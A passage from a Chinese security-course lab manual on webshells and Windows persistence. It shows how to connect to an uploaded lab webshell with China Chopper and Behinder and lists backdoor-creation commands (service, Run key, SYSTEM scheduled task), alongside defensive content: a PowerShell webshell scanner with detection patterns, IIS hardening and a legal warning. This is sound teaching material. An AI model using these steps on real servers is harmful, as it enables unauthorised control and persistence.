### 实验9：利用WebShell管理工具连接

#### 使用"中国菜刀"连接WebShell

1. 下载并打开中国菜刀（China Chopper）
2. 右键空白区域 → **添加**
3. 填写配置：
    - **地址**：`http://192.168.100.20/upload-labs/upload/shell.php`
    - **密码**：`cmd`（一句话木马中的POST参数名）
    - **类型**：`PHP`
4. 点击确定
5. 双击新添加的条目 → 连接成功
6. 可进行：文件管理、虚拟终端、数据库管理等操作

#### 使用"冰蝎"连接WebShell（加密通信）

1. 冰蝎需要配合专用的服务端WebShell（自带加密通信功能）
2. 服务端WebShell需要在上传前配置连接密码
3. 客户端添加目标 → 输入URL和密码 → 连接
4. 通信全程加密，WAF和IDS无法通过特征匹配检测

> 🔍 **检测冰蝎的思路**：虽然内容加密，但可以检测**流量行为特征**——如请求大小固定模式、通信周期规律、POST到动态脚本的频率异常等。基于AI的流量分析工具可以识别这些模式。

> 🛡️ **最简单有效的防御**：部署 WAF（Web 应用防火墙）拦截 WebShell 连接流量。对于免费方案，可使用 IIS 的"IP 和域限制"功能：IIS 管理器 → 网站 → IP 地址和域限制 → 添加拒绝条目，仅允许可信 IP 访问管理后台和上传目录。同时，定期使用 D 盾（免费工具）扫描 Web 目录，它能识别绝大多数已知 WebShell 特征。

---

### 实验10：WebShell检测与防御加固

#### 方法一：使用PowerShell脚本检测WebShell

```powershell
# ============================================
# WebShell检测脚本
# 扫描Web目录中的可疑文件
# ============================================

$webRoot = "C:\phpstudy_pro\WWW"  # 如使用IIS则改为 C:\inetpub\wwwroot
$suspiciousPatterns = @(
    'eval\s*\(',
    'base64_decode\s*\(',
    'system\s*\(',
    'exec\s*\(',
    'passthru\s*\(',
    'shell_exec\s*\(',
    'assert\s*\(',
    'preg_replace.*\/e',
    'call_user_func',
    '\$\{.*\$\{',              # PHP变量变量名
    'WScript\.Shell',          # ASP/ASPX
    'Execute\s*\(',            # ASP
    'Response\.Write.*Exec',   # ASPX
    'cmd\.exe',
    'powershell'
)

Write-Host "`n========== WebShell扫描报告 ==========" -ForegroundColor Cyan
Write-Host "扫描目录: $webRoot"
Write-Host "扫描时间: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"

$results = @()
Get-ChildItem -Path $webRoot -Recurse -Include *.php,*.asp,*.aspx,*.jsp -ErrorAction SilentlyContinue | ForEach-Object {
    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
    if ($content) {
        foreach ($pattern in $suspiciousPatterns) {
            if ($content -match $pattern) {
                $results += [PSCustomObject]@{
                    FilePath = $_.FullName
                    Pattern = $pattern
                    LastModified = $_.LastWriteTime
                }
                break
            }
        }
    }
}

if ($results.Count -gt 0) {
    Write-Host "`n[警告] 发现 $($results.Count) 个可疑文件:" -ForegroundColor Red
    $results | Format-Table -AutoSize
} else {
    Write-Host "`n[通过] 未发现可疑文件" -ForegroundColor Green
}
```

#### 方法二：IIS安全加固防止WebShell

**界面方式（IIS 管理器）**：

**操作1：上传目录禁止脚本执行（最关键）**

1. 打开 IIS 管理器（`Win+R` 输入 `inetmgr`）
2. 左侧展开网站，找到上传目录（如 `upload`）
3. 双击该目录，中间面板双击"处理程序映射"
4. 右侧"操作"面板 → 点击"编辑功能权限"
5. **取消勾选"脚本"**，仅保留"读取"
6. 确定保存

**操作2：配置请求筛选拒绝危险扩展名**

1. 选中上传目录，双击"请求筛选"
2. 切换到"文件扩展名"选项卡
3. 右侧"操作" → "拒绝文件扩展名"
4. 依次添加：`.php`、`.asp`、`.aspx`、`.jsp`、`.exe`、`.bat`
5. 确定保存

**操作3：限制上传文件大小**

1. 选中网站根节点，双击"请求筛选"
2. 右侧"操作" → "编辑功能设置"
3. "允许的最大内容长度"设为 `1048576`（1MB）
4. 确定保存

**命令行方式**：

```powershell
# ============================================
# IIS上传目录安全加固
# 核心原则：上传目录禁止脚本执行
# ============================================

# 1. 上传目录禁止脚本执行权限
# 在IIS管理器中操作：
# 网站 → uploads目录 → 处理程序映射 → 编辑功能权限 → 取消"脚本"勾选

# 通过PowerShell操作：
Import-Module WebAdministration
Set-WebConfigurationProperty -Filter "/system.webServer/handlers" `
    -PSPath "IIS:\Sites\Default Web Site\upload-labs\upload" `
    -Name "accessPolicy" -Value "Read"

# 2. 配置请求筛选，拒绝上传目录执行脚本
Add-WebConfigurationProperty -Filter "/system.webServer/security/requestFiltering/fileExtensions" `
    -PSPath "IIS:\Sites\Default Web Site\upload-labs\upload" `
    -Name "." -Value @{fileExtension=".php";allowed="false"}

Add-WebConfigurationProperty -Filter "/system.webServer/security/requestFiltering/fileExtensions" `
    -PSPath "IIS:\Sites\Default Web Site\upload-labs\upload" `
    -Name "." -Value @{fileExtension=".asp";allowed="false"}

# 3. 限制上传文件大小（最大1MB）
Set-WebConfigurationProperty -Filter "/system.webServer/security/requestFiltering/requestLimits" `
    -PSPath "IIS:\Sites\Default Web Site" `
    -Name "maxAllowedContentLength" -Value 1048576

# 4. 通过NTFS权限限制上传目录
$uploadPath = "C:\inetpub\wwwroot\upload-labs\upload"
$acl = Get-Acl $uploadPath
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
    "IIS_IUSRS", "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow"
)
$acl.SetAccessRule($rule)
Set-Acl $uploadPath $acl
```

**Web安全加固Web.config模板**：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <!-- 上传目录配置：禁止脚本执行 -->
    <handlers accessPolicy="Read">
      <!-- 移除所有脚本处理程序，仅保留静态文件读取 -->
      <remove name="PHP_via_FastCGI" />
      <remove name="ASPClassic" />
      <remove name="PageHandlerFactory-Integrated" />
    </handlers>

    <!-- 请求筛选 -->
    <security>
      <requestFiltering>
        <!-- 限制上传文件大小 1MB -->
        <requestLimits maxAllowedContentLength="1048576" />
        <!-- 拒绝危险扩展名 -->
        <fileExtensions allowUnlisted="true">
          <add fileExtension=".config" allowed="false" />
          <add fileExtension=".exe" allowed="false" />
          <add fileExtension=".bat" allowed="false" />
          <add fileExtension=".cmd" allowed="false" />
          <add fileExtension=".ps1" allowed="false" />
        </fileExtensions>
      </requestFiltering>
    </security>

    <!-- 安全响应头 -->
    <httpProtocol>
      <customHeaders>
        <remove name="X-Powered-By" />
        <add name="X-Frame-Options" value="SAMEORIGIN" />
        <add name="X-Content-Type-Options" value="nosniff" />
      </customHeaders>
    </httpProtocol>

    <!-- 禁用目录浏览 -->
    <directoryBrowse enabled="false" />

    <!-- 自定义错误页 -->
    <httpErrors errorMode="DetailedLocalOnly" existingResponse="Replace">
      <remove statusCode="404" />
      <error statusCode="404" path="/errors/404.html" responseMode="ExecuteURL" />
    </httpErrors>
  </system.webServer>
</configuration>
```

---

## 📝 任务二知识点总结

> **本任务核心**：任务二从 Web 应用层切入，系统讨论木马的分类体系、WebShell 的工作机制、文件上传漏洞的完整利用链，并从检测与防护两个维度建立面向 WebShell 威胁的综合应对策略。

| 知识点 | 要点 |
| --- | --- |
| WebShell本质 | 以Web脚本形式存在的恶意程序，通过HTTP请求远程控制服务器 |
| 一句话木马核心 | `eval`类函数将字符串作为代码执行，是所有一句话木马的关键 |
| 文件上传利用链 | 发现上传点→绕过前端→绕过后端→上传WebShell→远程控制 |
| 前端验证不安全 | JavaScript运行在客户端，可被绕过/禁用，安全验证必须在服务端 |
| 上传目录防护 | **禁止脚本执行权限**是最有效的WebShell防护手段 |
| 现代WebShell工具 | 冰蝎/哥斯拉使用加密通信，传统特征检测失效，需要流量行为分析 |
| 检测方法 | 文件特征扫描+文件哈希比对+流量分析+行为检测+完整性监控 |
| 防御体系 | 预防（白名单+权限）→ 检测（WAF+RASP）→ 响应（扫描+日志）→ 恢复（清除+加固） |

---

# 📚 项目七知识点总结

## 核心操作速查表

| 操作 | 命令/方法 |
| --- | --- |
| 创建服务后门 | `sc create "服务名" binpath="路径" start=auto` |
| 检测可疑服务 | `Get-WmiObject Win32_Service \| Where-Object {$_.PathName -notlike "*System32*"}` |
| 删除服务后门 | `sc stop "服务名"` → `sc delete "服务名"` |
| 创建注册表后门 | `reg add "HKLM\...\Run" /v "键名" /d "程序路径"` |
| 检测注册表后门 | `Get-ItemProperty "HKLM:\...\Run"` |
| 创建计划任务后门 | `schtasks /create /tn "任务名" /tr "程序路径" /sc onstart /ru SYSTEM` |
| 检测计划任务 | `Get-ScheduledTask \| Where-Object {$_.Author -notlike "Microsoft*"}` |
| 检测WMI后门 | `Get-WmiObject -Namespace "root\subscription" -Class __EventFilter` |
| 检查文件篡改 | `Get-FileHash 文件路径 -Algorithm SHA256` |
| 检查网络连接 | `Get-NetTCPConnection -State Established` |
| 检查可疑进程 | `Get-Process \| Where-Object {$_.Path -like "*Temp*"}` |
| 上传目录禁止执行 | IIS管理器 → 目录 → 处理程序映射 → 取消"脚本"权限 |
| WebShell扫描 | D盾、河马WebShell查杀、自定义PowerShell脚本 |

## 常见错误排查表

| 问题 | 可能原因 | 解决方法 |
| --- | --- | --- |
| 粘滞键后门不生效 | 系统文件保护阻止替换 | 需要已有SYSTEM权限或WinPE环境操作 |
| 计划任务不执行 | 任务创建但路径不存在 | 确认恶意程序路径正确且文件存在 |
| WebShell上传成功但无法访问 | IIS未配置PHP解析 | 安装PHP模块或使用ASPX木马替代 |
| WebShell上传后返回403 | 上传目录有执行权限限制 | 这正是防御措施！说明安全加固有效 |
| WMI后门删除后仍触发 | WMI仓库缓存 | 重启WMI服务：`Restart-Service Winmgmt` |
| 启动项删除后仍自动运行 | 还存在其他自启动位置未清理 | 继续排查启动文件夹、计划任务、服务和WMI订阅 |

---

## 安全意识

### 攻防对抗思维

> **核心理念**：网络安全的本质并非依靠"安装杀毒软件即可"，而在于"分层布防、纵深防御"。本项目从攻击者视角揭示后门与 WebShell 的实现机制，旨在说明：唯有透彻理解攻击原理，方能构建具有针对性与有效性的防御体系。

### 企业环境防御最佳实践

| 防御层次 | 措施 | 对应威胁 |
| --- | --- | --- |
| **终端防护** | 部署EDR（端点检测与响应），不依赖传统特征码杀毒 | 反弹木马、免杀后门 |
| **应用防护** | 上传目录禁止执行、WAF检测异常请求、RASP运行时保护 | WebShell上传和利用 |
| **系统加固** | 最小权限原则、定期安全扫描、文件完整性监控 | 注册表/服务/计划任务后门 |
| **网络防护** | IDS/IPS、流量行为分析、出站流量控制 | 加密WebShell通信、反弹连接 |
| **日志审计** | 集中日志收集（SIEM）、异常行为告警 | WMI后门、隐蔽持久化 |
| **应急响应** | 制定应急响应预案、定期演练、后门排查清单 | 后门检测与清除 |
| **安全意识** | 定期安全培训、钓鱼邮件演练、合规操作教育 | 社会工程学攻击 |

### 免责与法律意识

> **法律红线**：在中国，《网络安全法》《刑法》第285条（非法侵入计算机信息系统罪）和第286条（破坏计算机信息系统罪）明确规定，未经授权对计算机信息系统实施渗透测试、植入后门、上传WebShell等行为属于违法犯罪，最高可处七年有期徒刑。
>
> **合法授权是底线**：即使是安全研究人员，也必须在取得书面授权后才能进行渗透测试。教学实验环境（如虚拟机靶场）是学习这些技术的唯一合法场景。

---

## 课堂思考

1. **后门检测**：相较于注册表后门，为何 WMI 事件订阅后门更难被发现？作为安全运维人员，应如何建立 WMI 后门的常态化排查机制？

2. **WebShell 防护**：项目四中介绍了 IIS"请求筛选"对特定扩展名的拒绝能力。结合本项目的 WebShell 知识，请论证"上传目录禁止脚本执行权限"为何比"请求筛选拒绝 .php 扩展名"更具防护效力。

3. **攻防对抗**：传统杀毒软件难以有效检测冰蝎（Behinder）等加密 WebShell 的原因是什么？现代 EDR 相对于传统杀软提供了哪些技术演进？

4. **应急响应**：假设你是一台 Windows 服务器的安全管理员，发现 CPU 占用率异常升高且存在未知的对外网络连接。请按时间轴列出完整的排查步骤与应急处置流程。

5. **纵深防御**：综合本项目所学的后门技术与 WebShell 利用方法，请为一台面向公网的 IIS Web 服务器设计完整的安全防护方案，并按优先级排序各项措施。

---

## 知识关联

本项目与前序项目的知识关联如下：

| 关联项目 | 关联内容 |
| --- | --- |
| **项目四·IIS 网站管理** | WebShell 攻击的载体即为 IIS Web 服务。项目四所介绍的安全加固措施（请求筛选、权限控制、日志审计）构成抵御 WebShell 的第一道防线 |
| **项目四·上传目录权限** | "上传目录禁止脚本执行权限"是抵御 WebShell 最有效的单一措施，直接承袭项目四中 NTFS 权限配置的相关知识 |
| **项目二·用户管理** | 弱口令、高权限账户与不规范的授权策略，是后门植入与 WebShell 利用后实施权限扩张的常见基础 |
| **项目六·域管理** | 域控制器一旦失陷，攻击者可借助组策略（GPO）批量分发后门，威胁波及全域计算机；保护域控即保护整个域 |
| **项目四·纵深防御** | 本项目所阐述的后门检测与 WebShell 防御完全遵循纵深防御原则——不依赖任何单一手段，强调多层防护的协同与互补 |

### MITRE ATT&CK 框架映射

本项目涉及的攻击技术在 MITRE ATT&CK 框架中的对应关系：

| 本项目技术 | ATT&CK战术 | ATT&CK技术ID |
| --- | --- | --- |
| 注册表Run键后门 | 持久化（Persistence） | T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys |
| 计划任务后门 | 持久化（Persistence） | T1053.005 - Scheduled Task |
| 服务后门 | 持久化（Persistence） | T1543.003 - Windows Service |
| WMI事件订阅 | 持久化（Persistence） | T1546.003 - Windows Management Instrumentation Event Subscription |
| DLL劫持 | 持久化/权限提升 | T1574.001 - DLL Search Order Hijacking |
| 粘滞键后门 | 持久化/防御规避 | T1546.008 - Accessibility Features |
| WebShell | 持久化/初始访问 | T1505.003 - Server Software Component: Web Shell |
